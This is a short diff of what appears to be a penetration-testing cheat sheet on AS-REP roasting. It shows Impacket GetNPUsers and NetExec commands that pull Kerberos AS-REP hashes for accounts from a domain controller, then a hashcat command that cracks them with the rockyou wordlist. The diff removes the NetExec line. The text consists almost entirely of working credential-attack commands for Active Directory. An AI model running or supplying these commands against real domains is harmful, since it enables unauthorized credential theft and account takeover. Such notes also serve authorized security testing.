@@ -10,8 +10,6 @@ Do ASREProasting
     
     Impacket-GetNPUsers domain/user -format hashcat -dc-ip DC_IP -dc-host dc.domain.local -outputfile asreproasted.txt -request
 
-    nxc ldap domain.local -u user -p pass --kdcHost DC_IP --asrep
-
 Crack Hash
 
     hashcat -m 18200 -a 0 asreproasted.txt /usr/share/wordlists/rockyou.txt
